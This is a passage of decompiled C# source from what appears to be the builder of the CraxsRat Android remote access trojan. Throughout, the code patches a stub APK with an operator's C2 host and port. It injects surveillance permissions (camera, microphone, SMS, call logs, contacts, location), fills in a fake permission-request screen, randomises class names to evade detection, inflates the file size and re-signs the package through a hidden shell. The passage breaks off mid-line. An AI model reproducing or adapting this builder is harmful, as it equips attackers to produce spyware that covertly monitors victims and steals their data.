				File.SetAttributes(path, FileAttributes.Normal);
				File.Delete(path);
			}
			foreach (string string_71 in directories)
			{
				Build.smethod_1(string_71);
			}
			Directory.Delete(string_70, false);
		}

		// Token: 0x060009C8 RID: 2504 RVA: 0x00068448 File Offset: 0x00066648
		private void method_22()
		{
			string str = this.method_36();
			Thread.Sleep(this.int_1);
			this.string_43 = str + "CraxsRat_Bilder";
			if (!Environment.Is64BitOperatingSystem)
			{
				this.string_44 = this.string_43 + "\\platformBinary32\\bin";
			}
			else
			{
				this.string_44 = this.string_43 + "\\platformBinary64\\bin";
			}
			try
			{
				if (Directory.Exists(this.string_43) & this.bool_4)
				{
					this.bool_4 = false;
					this.method_30("Deleting old Files...");
					this.method_30("Please Wait...");
					Build.smethod_0(this.string_43);
				}
			}
			catch (Exception ex)
			{
				this.method_30("File delete old" + ex.Message);
			}
			try
			{
				IL_C5:
				this.method_30("Extracting New Files...");
				if (Directory.Exists(this.string_43))
				{
					this.int_3 = 20;
					if (Directory.Exists(this.string_44))
					{
						this.int_3 = 30;
						if (Directory.Exists(this.string_44))
						{
							try
							{
								if (Directory.GetFiles(this.string_44, "*.*").Count<string>() == 0)
								{
									Module2.smethod_37(this.string_45, this.string_43);
								}
							}
							catch (Exception ex2)
							{
							}
						}
						this.int_3 = 35;
						for (;;)
						{
							Thread.Sleep(this.int_1);
							this.method_30("Read Configuration...");
							if (!(Directory.Exists(this.string_43) & Directory.Exists(this.string_44)))
							{
								break;
							}
							try
							{
								string path = this.string_44 + "\\temp";
								if (Directory.Exists(this.string_44 + "\\temp"))
								{
									Directory.Delete(path, true);
								}
								if (File.Exists(this.string_44 + "\\temp.apk"))
								{
									File.Delete(this.string_44 + "\\temp.apk");
								}
								if (File.Exists(this.string_44 + "\\output\\ready.apk"))
								{
									File.Delete(this.string_44 + "\\output\\ready.apk");
								}
								if (Operators.CompareString(this.string_32, "TEN", false) != 0)
								{
									File.WriteAllBytes(this.string_44 + "\\temp.apk", Module0.MYSTUB);
								}
								else
								{
									File.WriteAllBytes(this.string_44 + "\\temp.apk", Module0.MYSTUBTEN);
								}
								if (this.method_23())
								{
									this.int_3 = 40;
									NewLateBinding.LateCall(NewLateBinding.LateGet(this.process_0, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[]
									{
										"cd " + this.string_44
									}, null, null, null, true);
									NewLateBinding.LateCall(NewLateBinding.LateGet(this.process_0, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[]
									{
										"java -version"
									}, null, null, null, true);
									this.method_30("Working...");
								}
								break;
							}
							catch (Exception ex3)
							{
							}
						}
						return;
					}
					Directory.CreateDirectory(this.string_44);
				}
				else
				{
					Directory.CreateDirectory(this.string_43);
				}
			}
			catch (Exception ex4)
			{
				base.Close();
				return;
			}
			goto IL_C5;
		}

		// Token: 0x060009C9 RID: 2505 RVA: 0x000687FC File Offset: 0x000669FC
		private bool method_23()
		{
			bool result;
			try
			{
				this.process_0 = new Process();
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.process_0, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardOutput", new object[]
				{
					true
				}, null, null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.process_0, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardInput", new object[]
				{
					true
				}, null, null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.process_0, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardError", new object[]
				{
					true
				}, null, null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.process_0, null, "StartInfo", new object[0], null, null, null), null, "FileName", new object[]
				{
					"cmd.exe"
				}, null, null, false, true);
				((Process)this.process_0).OutputDataReceived += this.Process_OutputDataReceived;
				((Process)this.process_0).ErrorDataReceived += this.Process_OutputDataReceived;
				((Process)this.process_0).Exited += this.Process_Exited;
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.process_0, null, "StartInfo", new object[0], null, null, null), null, "UseShellExecute", new object[]
				{
					false
				}, null, null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.process_0, null, "StartInfo", new object[0], null, null, null), null, "CreateNoWindow", new object[]
				{
					true
				}, null, null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.process_0, null, "StartInfo", new object[0], null, null, null), null, "WindowStyle", new object[]
				{
					ProcessWindowStyle.Hidden
				}, null, null, false, true);
				NewLateBinding.LateSet(this.process_0, null, "EnableRaisingEvents", new object[]
				{
					true
				}, null, null);
				NewLateBinding.LateCall(this.process_0, null, "Start", new object[0], null, null, null, true);
				NewLateBinding.LateCall(this.process_0, null, "BeginOutputReadLine", new object[0], null, null, null, true);
				NewLateBinding.LateCall(this.process_0, null, "BeginErrorReadLine", new object[0], null, null, null, true);
				result = true;
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060009CA RID: 2506 RVA: 0x00068A98 File Offset: 0x00066C98
		public void Process_OutputDataReceived(object sender, DataReceivedEventArgs e)
		{
			try
			{
				if (base.InvokeRequired)
				{
					Build.GDelegate15 method = new Build.GDelegate15(this.Process_OutputDataReceived);
					base.Invoke(method, new object[]
					{
						sender,
						e
					});
				}
				else if (!string.IsNullOrEmpty(Conversions.ToString(NewLateBinding.LateGet(e, null, "Data", new object[0], null, null, null))))
				{
					Thread.Sleep(1);
					if (!NewLateBinding.LateGet(e, null, "Data", new object[0], null, null, null).ToString().Contains("OpenJDK"))
					{
						if (NewLateBinding.LateGet(e, null, "Data", new object[0], null, null, null).ToString().Contains("java -jar SignApk.jar") | NewLateBinding.LateGet(e, null, "Data", new object[0], null, null, null).ToString().Contains("java -jar " + this.string_44 + "\\SignApk.jar "))
						{
							this.method_25();
						}
						else if (NewLateBinding.LateGet(e, null, "Data", new object[0], null, null, null).ToString().Contains("Copying original files"))
						{
							new Thread(new ThreadStart(this.method_27))
							{
								IsBackground = true
							}.Start();
						}
						else if (NewLateBinding.LateGet(e, null, "Data", new object[0], null, null, null).ToString().Contains("Built apk"))
						{
							try
							{
								if (!this.CheckFakeSize.Checked)
								{
									goto IL_375;
								}
								if (this.bool_9 && this.bool_8)
								{
									goto IL_375;
								}
								if (!this.bool_10)
								{
									this.bool_10 = true;
									for (;;)
									{
										IL_1AA:
										string path = this.string_44 + "\\temp\\build\\apk\\res\\drawable-xxxhdpi\\freespace.png";
										if (File.Exists(path))
										{
											break;
										}
										Thread.Sleep(this.int_1);
									}
									this.int_0 = Conversions.ToInteger(this.TextSize.Text);
									for (;;)
									{
										if (!this.bool_8)
										{
											if (File.Exists(this.string_44 + "\\temp\\dist\\temp.apk"))
											{
												File.Delete(this.string_44 + "\\temp\\dist\\temp.apk");
											}
											this.method_30("Resize Apk");
											this.bool_8 = true;
											this.method_24(checked(this.int_0 * 1000));
											Thread.Sleep(5000);
										}
										else
										{
											if (this.bool_9)
											{
												break;
											}
											Thread.Sleep(5000);
										}
									}
									NewLateBinding.LateCall(NewLateBinding.LateGet(this.process_0, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[]
									{
										"apktool b temp"
									}, null, null, null, true);
									this.method_30("Rebuild apk");
									goto IL_4EE;
								}
								goto IL_375;
							}
							catch (Exception ex)
							{
								Thread.Sleep(this.int_1);
								goto IL_1AA;
							}
							goto IL_2C1;
							IL_375:
							while (!File.Exists(this.string_44 + "\\temp\\dist\\temp.apk"))
							{
								Thread.Sleep(5000);
								this.method_30("Not Yet");
							}
							IL_2C1:
							if (!this.bool_7)
							{
								if (!this.bool_7)
								{
									NewLateBinding.LateCall(NewLateBinding.LateGet(this.process_0, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[]
									{
										string.Concat(new string[]
										{
											"zipalign.exe -v 4 ",
											this.string_44,
											"\\temp\\dist\\temp.apk ",
											this.string_44,
											"\\temp\\dist\\tempzip.apk "
										})
									}, null, null, null, true);
									this.method_30(" Verification...");
									this.bool_7 = true;
								}
								Thread.Sleep(5000);
								goto IL_375;
							}
							this.method_30("Apk Signing...");
							File.Delete(this.string_44 + "\\certificate.pem");
							File.Delete(this.string_44 + "\\key.pk8");
							File.WriteAllBytes(this.string_44 + "\\certificate.pem", Module0.c);
							File.WriteAllBytes(this.string_44 + "\\key.pk8", Module0.k);
							NewLateBinding.LateCall(NewLateBinding.LateGet(this.process_0, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[]
							{
								string.Concat(new string[]
								{
									"java -jar ",
									this.string_44,
									"\\SignApk.jar sign --key ",
									this.string_44,
									"\\key.pk8 --cert ",
									this.string_44,
									"\\certificate.pem  --v2-signing-enabled true --v3-signing-enabled true --out ",
									this.string_44,
									"\\output\\ready.apk ",
									this.string_44,
									"\\temp\\dist\\temp.apk "
								})
							}, null, null, null, true);
							this.bool_5 = true;
						}
					}
					else if (!this.bool_11)
					{
						NewLateBinding.LateCall(NewLateBinding.LateGet(this.process_0, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[]
						{
							"apktool d temp.apk"
						}, null, null, null, true);
						this.bool_11 = true;
					}
					IL_4EE:
					if (!this.bool_5)
					{
						string text = NewLateBinding.LateGet(e, null, "Data", new object[0], null, null, null).ToString();
						if (!NewLateBinding.LateGet(e, null, "Data", new object[0], null, null, null).ToString().StartsWith("I:"))
						{
							this.method_31(text);
						}
						else
						{
							this.method_30(text.Replace("I:", ""));
						}
					}
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x060009CB RID: 2507 RVA: 0x00069044 File Offset: 0x00067244
		public void method_24(int int_4)
		{
			try
			{
				double num = Conversion.Val(int_4);
				num *= 1024.0;
				string str = Conversions.ToString(this.method_16(5, 15));
				string text = Path.GetTempPath() + "\\" + str + ".png";
				Module0.low.Save(text);
				FileStream fileStream = File.OpenWrite(text);
				long num2 = fileStream.Seek(0L, SeekOrigin.End);
				bool flag = false;
				checked
				{
					while ((double)num2 < num)
					{
						if (!flag)
						{
							flag = true;
							fileStream.WriteByte(1);
						}
						else
						{
							flag = false;
							fileStream.WriteByte(0);
						}
						num2 += 1L;
					}
					fileStream.Close();
					string text2 = this.string_44 + "\\temp\\res\\drawable-xxxhdpi\\freespace.png";
					if (File.Exists(text2))
					{
						File.Delete(text2);
					}
					File.Move(text, text2);
				}
			}
			catch (Exception ex)
			{
				Interaction.MsgBox("Resize apk error 1 " + ex.Message, MsgBoxStyle.OkOnly, null);
			}
			try
			{
				double num3 = Conversion.Val(int_4);
				num3 *= 1024.0;
				string str2 = Conversions.ToString(this.method_16(5, 15));
				string text3 = Path.GetTempPath() + "\\" + str2 + ".png";
				Module0.low.Save(text3);
				FileStream fileStream2 = File.OpenWrite(text3);
				long num4 = fileStream2.Seek(0L, SeekOrigin.End);
				bool flag2 = false;
				checked
				{
					while ((double)num4 < num3)
					{
						if (flag2)
						{
							flag2 = false;
							fileStream2.WriteByte(0);
						}
						else
						{
							flag2 = true;
							fileStream2.WriteByte(1);
						}
						num4 += 1L;
					}
					fileStream2.Close();
					string text4 = this.string_44 + "\\temp\\build\\apk\\res\\drawable-xxxhdpi\\freespace.png";
					if (File.Exists(text4))
					{
						File.Delete(text4);
					}
					File.Move(text3, text4);
				}
			}
			catch (Exception ex2)
			{
				Interaction.MsgBox("Resize apk error 2 " + ex2.Message, MsgBoxStyle.OkOnly, null);
			}
			this.bool_9 = true;
		}

		// Token: 0x060009CC RID: 2508 RVA: 0x0006926C File Offset: 0x0006746C
		private async void method_25()
		{
			this.method_32("\r\n->Finishing");
			string path;
			do
			{
				this.method_32(".");
				Thread.Sleep(100);
				path = this.string_44 + "\\output\\ready.apk";
			}
			while (!File.Exists(path));
			this.int_3 = 85;
			DateTime now = DateTime.Now;
			this.method_30("+----------- informations -----------+");
			this.method_30("name patch:" + this.string_38);
			this.method_30("version:" + this.string_39);
			checked
			{
				if (!this.string_36.Contains(":"))
				{
					this.method_30("DNS/ip:" + this.string_35);
					this.method_30("port:" + this.string_36);
				}
				else
				{
					this.method_30("DNS/ip:port");
					string[] array = this.string_35.Split(new string[]
					{
						":"
					}, StringSplitOptions.None);
					string[] array2 = this.string_36.Split(new string[]
					{
						":"
					}, StringSplitOptions.None);
					int num = array2.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						this.method_30(array[i] + ":" + array2[i]);
					}
				}
				for (;;)
				{
					Thread.Sleep(1);
					if (File.Exists(this.string_44 + "\\output\\info.inf"))
					{
						break;
					}
					this.method_30("-------------------");
					FileStream fileStream = File.Create(this.string_44 + "\\output\\info.inf");
					fileStream.Close();
					Thread.Sleep(1);
				}
				File.WriteAllText(this.string_44 + "\\output\\info.inf", string.Concat(new string[]
				{
					"name patch:",
					this.string_38,
					"\r\nversion:",
					this.string_39,
					"\r\nDNS/ip:",
					this.string_35,
					"\r\nport:",
					this.string_36
				}));
				this.int_3 = 100;
				await Task.Factory.StartNew(new Action(this.method_83), TaskCreationOptions.None);
				this.bool_6 = true;
			}
		}

		// Token: 0x060009CD RID: 2509 RVA: 0x000692A8 File Offset: 0x000674A8
		private void method_26()
		{
			checked
			{
				if (this.bool_5)
				{
					int num = 0;
					do
					{
						Thread.Sleep(1000);
						num++;
					}
					while (num <= 5);
					Process.Start(this.string_44 + "\\output");
				}
			}
		}

		// Token: 0x060009CE RID: 2510 RVA: 0x000692E8 File Offset: 0x000674E8
		private void method_27()
		{
			checked
			{
				for (;;)
				{
					Thread.Sleep(this.int_1);
					string path = this.string_44 + "\\temp\\res\\values\\strings.xml";
					string path2 = this.string_44 + "\\temp\\res\\values\\public.xml";
					try
					{
						if (!File.Exists(path2))
						{
							Thread.Sleep(this.int_1);
							continue;
						}
						string contents = File.ReadAllText(path2).Replace(Module0.GSTART, " ");
						File.Delete(path2);
						File.WriteAllText(path2, contents);
					}
					catch (Exception ex)
					{
						Thread.Sleep(this.int_1);
						continue;
					}
					string path3 = this.string_44 + "\\temp\\apktool.yml";
					string path4 = this.string_44 + "\\temp\\AndroidManifest.xml";
					string path5 = this.string_44 + "\\temp\\res\\values\\public.xml";
					string text = this.string_44 + "\\temp\\res\\layout\\q1q2q3q4q5q6.xml";
					string text2 = this.string_44 + "\\temp\\res\\layout\\s1s2s3s4s5s6.xml";
					string path6 = this.string_44 + "\\temp\\res\\xml\\prov_path.xml";
					try
					{
						if (!File.Exists(path6))
						{
							Thread.Sleep(this.int_1);
							continue;
						}
						string text3 = File.ReadAllText(path6);
						File.WriteAllText(path6, text3.Replace("suffix", this.string_42).Replace("spymax", this.package).Replace("stub7", this.name));
					}
					catch (Exception ex2)
					{
						Thread.Sleep(this.int_1);
						continue;
					}
					if (File.Exists(path))
					{
						string path7 = this.string_44 + "\\temp\\res\\layout\\activity_req_access.xml";
						while (!File.Exists(path7))
						{
							Thread.Sleep(this.int_1);
						}
						string contents2 = File.ReadAllText(path7).Replace("[LOG-TITLE]", this.logtitletext.Text).Replace("[MY-NAME]", this.string_38).Replace("[LOG-BODY]", this.logbodytext.Text.Replace("\r\n", "\\n")).Replace("x1x2x3x4x5x6", this.ico1).Replace("[LOG-BTN]", this.logbtntext.Text);
						File.WriteAllText(path7, contents2);
						string path8 = this.string_44 + "\\temp\\res\\layout\\loading.xml";
						while (!File.Exists(path8))
						{
							Thread.Sleep(this.int_1);
						}
						string contents3 = File.ReadAllText(path8).Replace("[MY-NAME]", this.string_38).Replace("x1x2x3x4x5x6", this.ico1);
						File.WriteAllText(path8, contents3);
						this.int_3 = 50;
						if (this.random_1 == null)
						{
							this.random_1 = new Random();
						}
						try
						{
							string text4 = "";
							int num = 1;
							do
							{
								text4 = Conversions.ToString(Operators.AddObject(text4, Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject("    <string name=\"" + this.strings_0[this.random_1.Next(0, this.strings_0.Length)], this.method_17(10, 15)), "\">"), this.strings_0[this.random_1.Next(0, this.strings_0.Length)]), this.method_19(25, 50)), "</string>"), "\r\n")));
								num++;
							}
							while (num <= 450);
							string contents4 = File.ReadAllText(path).Replace(Module0.GRESSTR, text4).Replace("[CYPHER_VICTIM]", this.string_37).Replace("[CYPHER_PATCH]", this.string_38).Replace("CYPHER_PATCH", this.string_38).Replace("[CYPHER_VERSION]", this.string_39).Replace("[CYPHER_PROPERTY]", this.string_40).Replace("[CYPHER_SLEEP]", this.string_41).Replace("[CYPHER_BIND]", this.string_2).Replace("[DISCRIP]", this.dscriptext.Text).Replace("[CYPHER_PERMI]", this.string_23).Replace("j1j2j3j4j5j6", this.string_47).Replace("c1c2c3c4c5c6", this.string_48).Replace("z1z2z3z4z5z6", this.string_49).Replace("f1f2f3f4f5f6", this.string_50).Replace("h1h2h3h4h5h6", this.string_51).Replace("t1t2t3t4t5t6", this.string_52).Replace("n1n2n3n4n5n6", this.str6).Replace("i1i2i3i4i5i6", this.str7).Replace("k1k2k3k4k5k6", this.str8).Replace("o1o2o3o4o5o6", this.str9).Replace("u1u2u3u4u5u6", this.str10).Replace("e1e2e3e4e5e6", this.str11).Replace("y1y2y3y4y5y6", this.str12).Replace("b1b2b3b4b5b6", this.app0).Replace("d1d2d3d4d5d6", this.ico0).Replace("x1x2x3x4x5x6", this.ico1).Replace("q1q2q3q4q5q6", this.web0).Replace("s1s2s3s4s5s6", this.noti8);
							File.WriteAllText(path, contents4);
							this.int_3 = 60;
							for (;;)
							{
								Thread.Sleep(this.int_1);
								if (File.Exists(path3))
								{
									try
									{
										string contents5 = File.ReadAllText(path3).Replace("3.31.165", this.string_39).Replace("818", this.string_29).Replace("331165", this.string_39.Replace(".", ""));
										File.WriteAllText(path3, contents5);
										break;
									}
									catch (Exception ex3)
									{
										Thread.Sleep(this.int_1);
									}
								}
								else
								{
									Thread.Sleep(this.int_1);
								}
							}
							this.int_3 = 65;
							for (;;)
							{
								Thread.Sleep(this.int_1);
								if (File.Exists(path4))
								{
									break;
								}
								Thread.Sleep(this.int_1);
							}
							string text5 = "";
							if (this.Primslist.Items.Count > 0)
							{
								try
								{
									foreach (object value in this.Primslist.Items)
									{
										string text6 = Conversions.ToString(value);
										try
										{
											uint num2 = <PrivateImplementationDetails>_1.ComputeStringHash(text6);
											if (num2 > 1539345862U)
											{
												if (num2 > 3312070850U)
												{
													if (num2 != 3354663273U)
													{
														if (num2 != 3736630014U)
														{
															if (num2 == 3880549230U)
															{
																if (Operators.CompareString(text6, "Camera", false) == 0)
																{
																	this.string_16 = "android.permission.CAMERA";
																	text5 += "    <uses-permission android:name=\"android.permission.CAMERA\"  />\r\n";
																}
															}
														}
														else if (Operators.CompareString(text6, "Read Call Logs", false) == 0)
														{
															this.string_13 = "android.permission.READ_CALL_LOG";
															text5 += "    <uses-permission android:name=\"android.permission.READ_CALL_LOG\"  />\r\n";
														}
													}
													else if (Operators.CompareString(text6, "Microphone", false) == 0)
													{
														this.string_17 = "android.permission.RECORD_AUDIO";
														text5 += "    <uses-permission android:name=\"android.permission.RECORD_AUDIO\" />\r\n";
													}
												}
												else if (num2 != 2136646191U)
												{
													if (num2 != 2680267739U)
													{
														if (num2 == 3312070850U)
														{
															if (Operators.CompareString(text6, "Send SMS", false) == 0)
															{
																this.string_9 = "android.permission.SEND_SMS";
																text5 += "    <uses-permission android:name=\"android.permission.SEND_SMS\" />\r\n";
															}
														}
													}
													else if (Operators.CompareString(text6, "Read Accounts", false) == 0)
													{
														this.string_15 = "android.permission.GET_ACCOUNTS";
														text5 += "    <uses-permission android:name=\"android.permission.GET_ACCOUNTS\"  />\r\n";
													}
												}
												else if (Operators.CompareString(text6, "Change Wallpaper", false) == 0)
												{
													this.string_11 = "android.permission.SET_WALLPAPER";
													text5 += "    <uses-permission android:name=\"android.permission.SET_WALLPAPER\" />\r\n";
												}
											}
											else if (num2 > 266377544U)
											{
												if (num2 != 356814414U)
												{
													if (num2 != 929987446U)
													{
														if (num2 == 1539345862U)
														{
															if (Operators.CompareString(text6, "Location", false) == 0)
															{
																this.string_18 = "android.permission.ACCESS_COARSE_LOCATION";
																this.string_19 = "android.permission.ACCESS_FINE_LOCATION";
																this.string_20 = "no";
																text5 += "    <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\" />\r\n";
																text5 += "    <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"  />\r\n";
															}
														}
													}
													else if (Operators.CompareString(text6, "Make Calls", false) == 0)
													{
														text5 += "    <uses-permission android:name=\"android.permission.CALL_PHONE\" />\r\n";
														this.string_21 = "android.permission.CALL_PHONE";
													}
												}
												else if (Operators.CompareString(text6, "Read Contacts", false) == 0)
												{
													this.string_14 = "android.permission.READ_CONTACTS";
													text5 += "    <uses-permission android:name=\"android.permission.READ_CONTACTS\"  />\r\n";
												}
											}
											else if (num2 != 246903157U)
											{
												if (num2 == 266377544U)
												{
													if (Operators.CompareString(text6, "Read SMS", false) == 0)
													{
														this.string_12 = "android.permission.READ_SMS";
														text5 += "    <uses-permission android:name=\"android.permission.READ_SMS\" />\r\n";
													}
												}
											}
											else if (Operators.CompareString(text6, "Record Calls", false) == 0)
											{
												this.string_10 = "android.permission.PROCESS_OUTGOING_CALLS";
												text5 += "    <uses-permission android:name=\"android.permission.PROCESS_OUTGOING_CALLS\" />\r\n";
											}
										}
										catch (Exception ex4)
										{
										}
									}
								}
								finally
								{
									IEnumerator enumerator;
									if (enumerator is IDisposable)
									{
										(enumerator as IDisposable).Dispose();
									}
								}
							}
							string text7 = File.ReadAllText(path4).Replace(Module0.Toreplaceprim, text5).Replace(Module0.HIDECODE, Module0.SDK29);
							if (text7.Contains("suffix"))
							{
								text7 = text7.Replace("suffix", this.string_42).Replace("spymax", this.package).Replace("stub7", this.name).Replace("ClassGen0", this.QQ0).Replace(Module0.HIDECODE, Module0.SDK29).Replace("ClassGen1", this.QQ1).Replace("ClassGen2", this.QQ2).Replace("ClassGen3", this.QQ3).Replace("ClassGen4", this.QQ4).Replace("ClassGen5", this.QQ5).Replace("ClassGen6", this.QQ6).Replace("ClassGen8", this.QQ8).Replace("ClassGen9", this.QQ9).Replace("ClassGen10", this.QQ10).Replace("ClassGen11", this.QQ11).Replace("ClassGen12", this.QQ12).Replace("ClassGen13", this.QQ13).Replace("activz", this.activz).Replace("servziz", this.servziz).Replace("tolziz", this.tolziz).Replace("brodatz", this.brodatz).Replace("ClassGen14", this.QQ14).Replace("_ask_battary_", this._ask_battary_).Replace("_ask_draw_", this._ask_draw_).Replace("_sc_fb_", this._sc_fb_).Replace("_news_g_", this._news_g_).Replace("_strt_view_", this._strt_view_).Replace("_scctrl_", this._scctrl_).Replace("_access_ask_", this._access_ask_).Replace("_cap_sc_", this._cap_sc_).Replace("_trns_g_", this._trns_g_).Replace("_ask_prim_", this._ask_prim_).Replace("_engine_wrk_", this._engine_wrk_).Replace("_skin_cls_", this._skin_cls_).Replace("_update_app_", this._update_app_).Replace("_callr_lsnr_", this._callr_lsnr_).Replace("_srv_worker_", this._srv_worker_).Replace("j1j2j3j4j5j6", this.string_47).Replace("c1c2c3c4c5c6", this.string_48).Replace("z1z2z3z4z5z6", this.string_49).Replace("f1f2f3f4f5f6", this.string_50).Replace("h1h2h3h4h5h6", this.string_51).Replace("t1t2t3t4t5t6", this.string_52).Replace("n1n2n3n4n5n6", this.str6).Replace("i1i2i3i4i5i6", this.str7).Replace("k1k2k3k4k5k6", this.str8).Replace("o1o2o3o4o5o6", this.str9).Replace("u1u2u3u4u5u6", this.str10).Replace("e1e2e3e4e5e6", this.str11).Replace("y1y2y3y4y5y6", this.str12).Replace("b1b2b3b4b5b6", this.app0).Replace("d1d2d3d4d5d6", this.ico0).Replace("x1x2x3x4x5x6", this.ico1).Replace("q1q2q3q4q5q6", this.web0).Replace("skin.name", this.string_24).Replace("trg.trgtapp.trg", this.string_33).Replace("RANDOM_STR1", Conversions.ToString(this.method_16(100, 150))).Replace("RANDOM_STR2", Conversions.ToString(this.method_16(100, 150))).Replace("RANDOM_STR3", Conversions.ToString(this.method_16(100, 150))).Replace("_randomS", Conversions.ToString(this.method_16(150, 200))).Replace("_shit_", Conversions.ToString(this.method_16(150, 200))).Replace(Module0.HIDECODE, Module0.SDK29).Replace(Module0.Toreplaceprim, text5).Replace("s1s2s3s4s5s6", this.noti8);
								File.WriteAllText(path4, text7);
							}
							this.int_3 = 70;
							string text8;
							for (;;)
							{
								text8 = this.string_44 + "\\temp\\res\\drawable\\x1x2x3x4x5x6.png";
								if (File.Exists(text8))
								{
									break;
								}
								Thread.Sleep(this.int_1);
							}
							MyProject.Computer.FileSystem.RenameFile(text8, this.ico1 + ".png");
							if (Operators.CompareString(this.string_8, "null", false) == 0)
							{
								string text9;
								for (;;)
								{
									text9 = this.string_44 + "\\temp\\res\\drawable\\d1d2d3d4d5d6.png";
									if (File.Exists(text9))
									{
										break;
									}
									Thread.Sleep(this.int_1);
								}
								MyProject.Computer.FileSystem.RenameFile(text9, this.ico0 + ".png");
							}
							else if (File.Exists(this.string_8))
							{
								string path9;
								for (;;)
								{
									Thread.Sleep(this.int_1);
									path9 = this.string_44 + "\\temp\\res\\drawable\\d1d2d3d4d5d6.png";
									string text10 = this.string_44 + "\\temp\\res\\drawable\\skinicon.png";
									try
									{
										if (Operators.CompareString(this.string_26, "null", false) != 0)
										{
											if (File.Exists(text10))
											{
												File.Delete(text10);
											}
											File.Copy(this.string_26, text10);
										}
										goto IL_EBA;
									}
									catch (Exception ex5)
									{
										goto IL_EBA;
									}
									IL_EAD:
									Thread.Sleep(this.int_1);
									continue;
									IL_EBA:
									if (File.Exists(path9))
									{
										break;
									}
									goto IL_EAD;
								}
								File.Delete(path9);
								Image image = Module2.smethod_38(Image.FromFile(this.string_8), new Size(144, 144), false);
								image.Save(this.string_44 + "\\temp\\res\\drawable\\" + this.ico0 + ".png");
							}
							if (Operators.CompareString(this.string_1, "null", false) != 0)
							{
								if (File.Exists(this.string_1))
								{
									string path10;
									for (;;)
									{
										Thread.Sleep(this.int_1);
										path10 = this.string_44 + "\\temp\\res\\raw\\b1b2b3b4b5b6";
										if (File.Exists(path10))
										{
											break;
										}
										Thread.Sleep(this.int_1);
									}
									File.Delete(path10);
									File.Copy(this.string_1, this.string_44 + "\\temp\\res\\raw\\" + this.app0, true);
								}
							}
							else
							{
								string text11;
								for (;;)
								{
									text11 = this.string_44 + "\\temp\\res\\raw\\b1b2b3b4b5b6";
									if (File.Exists(text11))
									{
										break;
									}
									Thread.Sleep(this.int_1);
								}
								MyProject.Computer.FileSystem.RenameFile(text11, this.app0);
							}
							for (;;)
							{
								try
								{
									string path11 = this.string_44 + "\\temp\\smali\\spymax\\stub7";
									if (Directory.Exists(path11))
									{
										DirectoryInfo directoryInfo = new DirectoryInfo(path11);
										FileInfo[] files = directoryInfo.GetFiles("*.smali");
										this.method_30("Encryption Started\r\n---------");
										foreach (FileInfo fileInfo in files)
										{
											string text12 = File.ReadAllText(fileInfo.FullName);
											if (Operators.CompareString(fileInfo.Name.ToLower(), "buildconfig.smali", false) == 0)
											{
												text12 = text12.Replace("payload", this.payload).Replace("suffix", this.string_42).Replace("spymax", this.package).Replace("stub7", this.name).Replace("j1j2j3j4j5j6", this.string_47).Replace("c1c2c3c4c5c6", this.string_48).Replace("z1z2z3z4z5z6", this.string_49).Replace("f1f2f3f4f5f6", this.string_50).Replace("h1h2h3h4h5h6", this.string_51).Replace("t1t2t3t4t5t6", this.string_52).Replace("n1n2n3n4n5n6", this.str6).Replace("i1i2i3i4i5i6", this.str7).Replace("k1k2k3k4k5k6", this.str8).Replace("o1o2o3o4o5o6", this.str9).Replace("u1u2u3u4u5u6", this.str10).Replace("e1e2e3e4e5e6", this.str11).Replace("y1y2y3y4y5y6", this.str12).Replace("b1b2b3b4b5b6", this.app0).Replace("d1d2d3d4d5d6", this.ico0).Replace("x1x2x3x4x5x6", this.ico1).Replace("q1q2q3q4q5q6", this.web0).Replace("s1s2s3s4s5s6", this.noti8);
											}
											else
											{
												text12 = text12.Replace("spymax", this.package).Replace("stub7", this.name).Replace("ClassGen0", this.QQ0).Replace("ClassGen1", this.QQ1).Replace("ClassGen2", this.QQ2).Replace("ClassGen3", this.QQ3).Replace("ClassGen4", this.QQ4).Replace("ClassGen5", this.QQ5).Replace("ClassGen6", this.QQ6).Replace("ClassGen8", this.QQ8).Replace("ClassGen9", this.QQ9).Replace("ClassGen10", this.QQ10).Replace("ClassGen11", this.QQ11).Replace("ClassGen12", this.QQ12).Replace("ClassGen13", this.QQ13).Replace("ClassGen14", this.QQ14).Replace("activz", this.activz).Replace("servziz", this.servziz).Replace("tolziz", this.tolziz).Replace("brodatz", this.brodatz).Replace("_ask_battary_", this._ask_battary_).Replace("_ask_draw_", this._ask_draw_).Replace("_sc_fb_", this._sc_fb_).Replace("_news_g_", this._news_g_).Replace("_strt_view_", this._strt_view_).Replace("_scctrl_", this._scctrl_).Replace("_access_ask_", this._access_ask_).Replace("_cap_sc_", this._cap_sc_).Replace("_trns_g_", this._trns_g_).Replace("_ask_prim_", this._ask_prim_).Replace("_engine_wrk_", this._engine_wrk_).Replace("_skin_cls_", this._skin_cls_).Replace("_update_app_", this._update_app_).Replace("_callr_lsnr_", this._callr_lsnr_).Replace("_clss_loder_", this._clss_loder_).Replace("_excut_meth_", this._excut_meth_).Replace("_run_comnd_", this._run_comnd_).Replace("_get_me_fil_", this._get_me_fil_).Replace("_srv_worker_", this._srv_worker_).Replace("j1j2j3j4j5j6", this.string_47).Replace("c1c2c3c4c5c6", this.string_48).Replace("z1z2z3z4z5z6", this.string_49).Replace("f1f2f3f4f5f6", this.string_50).Replace("h1h2h3h4h5h6", this.string_51).Replace("t1t2t3t4t5t6", this.string_52).Replace("n1n2n3n4n5n6", this.str6).Replace("i1i2i3i4i5i6", 